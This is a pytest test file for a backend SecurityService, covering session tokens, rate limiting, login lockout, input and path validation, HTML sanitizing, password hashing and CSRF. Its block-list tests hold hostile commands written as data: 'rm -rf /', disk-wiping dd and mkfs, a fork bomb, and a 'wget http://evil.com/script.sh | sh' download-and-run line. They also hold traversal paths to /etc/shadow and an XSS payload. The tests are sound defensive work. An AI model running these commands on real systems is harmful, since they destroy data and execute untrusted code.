"""
Unit Tests for Security Service
Demonstrates comprehensive testing of security features
"""

import pytest
from datetime import datetime, timedelta
from backend.services.security_service import SecurityService


class TestSecurityService:
    """Test suite for SecurityService"""
    
    def test_initialization(self, security_service):
        """Test security service initializes correctly"""
        assert security_service is not None
        assert security_service.rate_limit_store == {}
        assert security_service.blocked_ips == set()
        assert security_service.session_tokens == {}
        assert security_service.max_requests_per_minute == 60
    
    # ==================== SESSION TOKEN TESTS ====================
    
    def test_generate_session_token(self, security_service):
        """Test session token generation"""
        user_id = "user123"
        ip_address = "192.168.1.1"
        
        token = security_service.generate_session_token(user_id, ip_address)
        
        assert token is not None
        assert len(token) > 20  # Should be a long random string
        assert token in security_service.session_tokens
        
        session = security_service.session_tokens[token]
        assert session['user_id'] == user_id
        assert session['ip'] == ip_address
        assert 'expires_at' in session
        assert 'created_at' in session
    
    def test_validate_session_token_valid(self, security_service):
        """Test validation of valid session token"""
        user_id = "user123"
        ip_address = "192.168.1.1"
        
        token = security_service.generate_session_token(user_id, ip_address)
        is_valid, returned_user_id = security_service.validate_session_token(token, ip_address)
        
        assert is_valid is True
        assert returned_user_id == user_id
    
    def test_validate_session_token_invalid(self, security_service):
        """Test validation of invalid session token"""
        is_valid, user_id = security_service.validate_session_token("invalid_token", "192.168.1.1")
        
        assert is_valid is False
        assert user_id is None
    
    def test_validate_session_token_expired(self, security_service):
        """Test validation of expired session token"""
        user_id = "user123"
        ip_address = "192.168.1.1"
        
        token = security_service.generate_session_token(user_id, ip_address)
        
        # Manually expire the token
        security_service.session_tokens[token]['expires_at'] = datetime.now() - timedelta(seconds=1)
        
        is_valid, returned_user_id = security_service.validate_session_token(token, ip_address)
        
        assert is_valid is False
        assert returned_user_id is None
        assert token not in security_service.session_tokens  # Should be removed
    
    def test_revoke_session_token(self, security_service):
        """Test session token revocation"""
        user_id = "user123"
        ip_address = "192.168.1.1"
        
        token = security_service.generate_session_token(user_id, ip_address)
        assert token in security_service.session_tokens
        
        result = security_service.revoke_session_token(token)
        
        assert result is True
        assert token not in security_service.session_tokens
    
    def test_cleanup_expired_sessions(self, security_service):
        """Test cleanup of expired sessions"""
        # Create multiple tokens
        token1 = security_service.generate_session_token("user1", "192.168.1.1")
        token2 = security_service.generate_session_token("user2", "192.168.1.2")
        token3 = security_service.generate_session_token("user3", "192.168.1.3")
        
        # Expire two tokens
        security_service.session_tokens[token1]['expires_at'] = datetime.now() - timedelta(seconds=1)
        security_service.session_tokens[token2]['expires_at'] = datetime.now() - timedelta(seconds=1)
        
        security_service.cleanup_expired_sessions()
        
        assert token1 not in security_service.session_tokens
        assert token2 not in security_service.session_tokens
        assert token3 in security_service.session_tokens
    
    # ==================== RATE LIMITING TESTS ====================
    
    def test_check_rate_limit_allowed(self, security_service):
        """Test rate limit allows normal traffic"""
        ip_address = "192.168.1.1"
        
        is_allowed, error = security_service.check_rate_limit(ip_address)
        
        assert is_allowed is True
        assert error is None
        assert ip_address in security_service.rate_limit_store
    
    def test_check_rate_limit_exceeded(self, security_service):
        """Test rate limit blocks excessive traffic"""
        ip_address = "192.168.1.1"
        
        # Make max_requests_per_minute requests
        for _ in range(security_service.max_requests_per_minute):
            security_service.check_rate_limit(ip_address)
        
        # Next request should be blocked
        is_allowed, error = security_service.check_rate_limit(ip_address)
        
        assert is_allowed is False
        assert error is not None
        assert "Rate limit exceeded" in error
        assert ip_address in security_service.blocked_ips
    
    def test_unblock_ip(self, security_service):
        """Test IP unblocking"""
        ip_address = "192.168.1.1"
        
        security_service.blocked_ips.add(ip_address)
        assert ip_address in security_service.blocked_ips
        
        security_service.unblock_ip(ip_address)
        
        assert ip_address not in security_service.blocked_ips
    
    # ==================== FAILED LOGIN TESTS ====================
    
    def test_record_failed_login(self, security_service):
        """Test recording failed login attempts"""
        ip_address = "192.168.1.1"
        
        should_lockout = security_service.record_failed_login(ip_address)
        
        assert should_lockout is False
        assert ip_address in security_service.failed_login_attempts
        assert len(security_service.failed_login_attempts[ip_address]) == 1
    
    def test_record_failed_login_lockout(self, security_service):
        """Test lockout after max failed attempts"""
        ip_address = "192.168.1.1"
        
        # Record max_failed_logins attempts
        for i in range(security_service.max_failed_logins):
            should_lockout = security_service.record_failed_login(ip_address)
            if i < security_service.max_failed_logins - 1:
                assert should_lockout is False
        
        # Last attempt should trigger lockout
        assert should_lockout is True
        assert ip_address in security_service.blocked_ips
    
    def test_clear_failed_logins(self, security_service):
        """Test clearing failed login attempts"""
        ip_address = "192.168.1.1"
        
        security_service.record_failed_login(ip_address)
        assert ip_address in security_service.failed_login_attempts
        
        security_service.clear_failed_logins(ip_address)
        
        assert ip_address not in security_service.failed_login_attempts
    
    # ==================== INPUT VALIDATION TESTS ====================
    
    def test_validate_command_safe(self, security_service):
        """Test validation of safe commands"""
        safe_commands = [
            "ls -la",
            "python script.py",
            "git status",
            "npm install"
        ]
        
        for command in safe_commands:
            is_safe, error = security_service.validate_command(command)
            assert is_safe is True, f"Command '{command}' should be safe"
            assert error is None
    
    def test_validate_command_dangerous(self, security_service):
        """Test validation blocks dangerous commands"""
        dangerous_commands = [
            "rm -rf /",
            "mkfs.ext4 /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod -R 777 /",
            "wget http://evil.com/script.sh | sh",
            "eval('malicious code')"
        ]
        
        for command in dangerous_commands:
            is_safe, error = security_service.validate_command(command)
            assert is_safe is False, f"Command '{command}' should be blocked"
            assert error is not None
    
    def test_validate_command_empty(self, security_service):
        """Test validation of empty command"""
        is_safe, error = security_service.validate_command("")
        
        assert is_safe is False
        assert error == "Empty command"
    
    def test_validate_command_too_long(self, security_service):
        """Test validation of overly long command"""
        long_command = "a" * 10001
        
        is_safe, error = security_service.validate_command(long_command)
        
        assert is_safe is False
        assert "too long" in error
    
    def test_sanitize_path_valid(self, security_service):
        """Test path sanitization for valid paths"""
        valid_paths = [
            "project/file.py",
            "src/main.py",
            "docs/readme.md"
        ]
        
        for path in valid_paths:
            is_safe, sanitized, error = security_service.sanitize_path(path)
            assert is_safe is True, f"Path '{path}' should be valid"
            assert sanitized == path.strip()
            assert error is None
    
    def test_sanitize_path_traversal(self, security_service):
        """Test path sanitization blocks traversal attempts"""
        malicious_paths = [
            "../etc/passwd",
            "../../secret.txt",
            "/etc/shadow",
            "~/private/data"
        ]
        
        for path in malicious_paths:
            is_safe, sanitized, error = security_service.sanitize_path(path)
            assert is_safe is False, f"Path '{path}' should be blocked"
            assert error is not None
    
    def test_validate_filename_valid(self, security_service):
        """Test filename validation for valid names"""
        valid_names = [
            "script.py",
            "README.md",
            "my-file_v2.txt"
        ]
        
        for filename in valid_names:
            is_valid, error = security_service.validate_filename(filename)
            assert is_valid is True, f"Filename '{filename}' should be valid"
            assert error is None
    
    def test_validate_filename_invalid(self, security_service):
        """Test filename validation blocks invalid names"""
        invalid_names = [
            "file<script>.txt",
            "file:name.txt",
            "file|name.txt",
            "CON",  # Reserved Windows name
            "a" * 256  # Too long
        ]
        
        for filename in invalid_names:
            is_valid, error = security_service.validate_filename(filename)
            assert is_valid is False, f"Filename '{filename}' should be invalid"
            assert error is not None
    
    def test_sanitize_html(self, security_service):
        """Test HTML sanitization"""
        html_input = '<script>alert("XSS")</script>'
        sanitized = security_service.sanitize_html(html_input)
        
        assert '<script>' not in sanitized
        assert '&lt;script&gt;' in sanitized
    
    def test_validate_json_input_valid(self, security_service):
        """Test JSON input validation for valid data"""
        data = {
            'username': 'john',
            'email': 'john@example.com',
            'password': 'secret123'
        }
        required_fields = ['username', 'email', 'password']
        
        is_valid, error = security_service.validate_json_input(data, required_fields)
        
        assert is_valid is True
        assert error is None
    
    def test_validate_json_input_missing_fields(self, security_service):
        """Test JSON input validation detects missing fields"""
        data = {
            'username': 'john'
        }
        required_fields = ['username', 'email', 'password']
        
        is_valid, error = security_service.validate_json_input(data, required_fields)
        
        assert is_valid is False
        assert error is not None
        assert 'Missing required fields' in error
    
    # ==================== PASSWORD HASHING TESTS ====================
    
    def test_hash_password(self, security_service):
        """Test password hashing"""
        password = "mySecurePassword123"
        
        hashed = security_service.hash_password(password)
        
        assert hashed is not None
        assert '$' in hashed  # Should contain salt separator
        assert hashed != password  # Should be hashed
    
    def test_verify_password_correct(self, security_service):
        """Test password verification with correct password"""
        password = "mySecurePassword123"
        hashed = security_service.hash_password(password)
        
        is_valid = security_service.verify_password(password, hashed)
        
        assert is_valid is True
    
    def test_verify_password_incorrect(self, security_service):
        """Test password verification with incorrect password"""
        password = "mySecurePassword123"
        wrong_password = "wrongPassword"
        hashed = security_service.hash_password(password)
        
        is_valid = security_service.verify_password(wrong_password, hashed)
        
        assert is_valid is False
    
    # ==================== CSRF TESTS ====================
    
    def test_generate_csrf_token(self, security_service):
        """Test CSRF token generation"""
        token = security_service.generate_csrf_token()
        
        assert token is not None
        assert len(token) > 20
    
    def test_validate_csrf_token_valid(self, security_service):
        """Test CSRF token validation with valid token"""
        token = security_service.generate_csrf_token()
        
        is_valid = security_service.validate_csrf_token(token, token)
        
        assert is_valid is True
    
    def test_validate_csrf_token_invalid(self, security_service):
        """Test CSRF token validation with invalid token"""
        token1 = security_service.generate_csrf_token()
        token2 = security_service.generate_csrf_token()
        
        is_valid = security_service.validate_csrf_token(token1, token2)
        
        assert is_valid is False
    
    # ==================== STATUS TESTS ====================
    
    def test_get_status(self, security_service):
        """Test getting security service status"""
        # Create some test data
        security_service.generate_session_token("user1", "192.168.1.1")
        security_service.generate_session_token("user2", "192.168.1.2")
        security_service.blocked_ips.add("192.168.1.100")
        
        status = security_service.get_status()
        
        assert 'active_sessions' in status
        assert 'blocked_ips' in status
        assert 'rate_limited_ips' in status
        assert 'failed_login_tracking' in status
        assert status['active_sessions'] == 2
        assert status['blocked_ips'] == 1


# ==================== INTEGRATION TESTS ====================

@pytest.mark.integration
class TestSecurityServiceIntegration:
    """Integration tests for security service"""
    
    def test_full_authentication_flow(self, security_service):
        """Test complete authentication flow"""
        user_id = "user123"
        ip_address = "192.168.1.1"
        
        # Generate token
        token = security_service.generate_session_token(user_id, ip_address)
        assert token is not None
        
        # Validate token
        is_valid, returned_user_id = security_service.validate_session_token(token, ip_address)
        assert is_valid is True
        assert returned_user_id == user_id
        
        # Revoke token
        security_service.revoke_session_token(token)
        
        # Validate again (should fail)
        is_valid, returned_user_id = security_service.validate_session_token(token, ip_address)
        assert is_valid is False
    
    def test_rate_limiting_and_recovery(self, security_service):
        """Test rate limiting with recovery"""
        ip_address = "192.168.1.1"
        
        # Exceed rate limit
        for _ in range(security_service.max_requests_per_minute + 1):
            security_service.check_rate_limit(ip_address)
        
        # Should be blocked
        is_allowed, error = security_service.check_rate_limit(ip_address)
        assert is_allowed is False
        
        # Unblock
        security_service.unblock_ip(ip_address)
        
        # Clean up rate limit store
        security_service.rate_limit_store[ip_address] = []
        
        # Should be allowed again
        is_allowed, error = security_service.check_rate_limit(ip_address)
        assert is_allowed is True
